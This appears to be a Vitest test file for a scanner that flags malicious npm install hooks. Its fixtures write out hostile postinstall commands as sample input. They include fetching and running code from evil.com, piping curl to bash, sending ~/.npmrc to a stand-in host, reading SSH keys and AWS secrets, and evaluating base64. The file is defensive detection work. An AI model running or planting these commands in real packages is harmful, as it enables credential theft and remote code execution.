import { describe, it, expect } from "vitest";
import { analyzeInstallHooks, extractInstallScripts } from "../install-hook-scanner.js";

describe("Install Hook Scanner", () => {
  it("should detect network access in postinstall", () => {
    const findings = analyzeInstallHooks(
      { postinstall: 'node -e "fetch(\'https://evil.com/payload\')"' },
      "package.json",
    );
    expect(findings.some((f) => f.rule === "INSTALL_HOOK_NETWORK")).toBe(true);
  });

  it("should detect download + exec chain", () => {
    const findings = analyzeInstallHooks(
      { postinstall: "curl https://evil.com/x.sh -o /tmp/x.sh && chmod +x /tmp/x.sh && /tmp/x.sh" },
      "package.json",
    );
    expect(findings.some((f) => f.rule === "INSTALL_HOOK_DOWNLOAD_EXEC")).toBe(true);
  });

  it("should detect env variable harvesting", () => {
    const findings = analyzeInstallHooks(
      { postinstall: 'node -e "console.log(process.env.AWS_SECRET_ACCESS_KEY)"' },
      "package.json",
    );
    expect(findings.some((f) => f.rule === "INSTALL_HOOK_ENV_HARVEST")).toBe(true);
  });

  it("should detect .npmrc reading", () => {
    const findings = analyzeInstallHooks(
      { postinstall: "cat ~/.npmrc | curl -X POST https://evil.com -d @-" },
      "package.json",
    );
    expect(findings.some((f) => f.rule === "INSTALL_HOOK_NPMRC_READ")).toBe(true);
  });

  it("should detect SSH key reading", () => {
    const findings = analyzeInstallHooks(
      { preinstall: "cat ~/.ssh/id_rsa" },
      "package.json",
    );
    expect(findings.some((f) => f.rule === "INSTALL_HOOK_NPMRC_READ")).toBe(true);
  });

  it("should detect .env file reading", () => {
    const findings = analyzeInstallHooks(
      { postinstall: 'require("dotenv").config()' },
      "package.json",
    );
    expect(findings.some((f) => f.rule === "INSTALL_HOOK_DOTENV_READ")).toBe(true);
  });

  it("should detect obfuscated scripts", () => {
    const findings = analyzeInstallHooks(
      { postinstall: 'node -e "eval(atob(\'Y29uc29sZS5sb2coMSk=\'))"' },
      "package.json",
    );
    expect(findings.some((f) => f.rule === "INSTALL_HOOK_OBFUSCATED")).toBe(true);
  });

  it("should detect long one-liners", () => {
    const longScript = "a".repeat(600);
    const findings = analyzeInstallHooks(
      { postinstall: longScript },
      "package.json",
    );
    expect(findings.some((f) => f.rule === "INSTALL_HOOK_LONG_ONELINER")).toBe(true);
  });

  it("should detect binary blobs", () => {
    const blob = "A".repeat(1200);
    const findings = analyzeInstallHooks(
      { postinstall: `node -e "Buffer.from('${blob}', 'base64')"` },
      "package.json",
    );
    expect(findings.some((f) => f.rule === "INSTALL_HOOK_BINARY_BLOB")).toBe(true);
  });

  it("should return empty for clean scripts", () => {
    const findings = analyzeInstallHooks(
      { postinstall: "node scripts/build.js" },
      "package.json",
    );
    expect(findings).toHaveLength(0);
  });

  it("should include confidence scores", () => {
    const findings = analyzeInstallHooks(
      { postinstall: "curl https://evil.com/x | bash" },
      "package.json",
    );
    expect(findings[0]?.confidence).toBeGreaterThan(0);
  });

  it("should extract install scripts from package.json", () => {
    const scripts = extractInstallScripts(JSON.stringify({
      scripts: { postinstall: "echo hello", build: "tsc" },
    }));
    expect(scripts?.postinstall).toBe("echo hello");
    expect(scripts).not.toHaveProperty("build");
  });
});
